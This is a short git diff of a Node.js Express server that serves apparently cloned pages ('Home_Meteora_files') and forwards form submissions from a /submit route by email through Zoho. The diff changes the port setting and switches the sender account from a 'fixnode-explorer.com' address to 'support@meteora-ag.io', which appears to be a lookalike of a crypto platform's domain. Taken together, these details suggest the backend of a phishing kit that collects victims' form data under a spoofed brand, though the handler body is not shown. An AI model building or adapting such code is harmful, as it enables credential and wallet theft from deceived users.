@@ -5,13 +5,11 @@ const dotenv = require('dotenv')
 const app = express()
 dotenv.config()
 
-const PORT = 4400
-
+const PORT = process.env.PORT
 app.use(express.static("views"))
 app.use(express.static(__dirname + "/public/"))
 
-app.use(express.static(__dirname + "/views/Home_Meteora_files/"))
-app.use(express.static(__dirname + "/views/index_files/"))
+app.use(express.static(__dirname + "/views/Index_files/"))
 
 app.use(bodyParser.urlencoded({ extended: true }))
 
@@ -38,7 +36,7 @@ app.post('/submit', async (req, res) => {
     const transporter = nodemailer.createTransport({
         service: 'zoho',
         auth: {
-            user: "forwarding@fixnode-explorer.com",
+            user: "support@meteora-ag.io",
             pass: process.env.PASSWORD
         }
     })
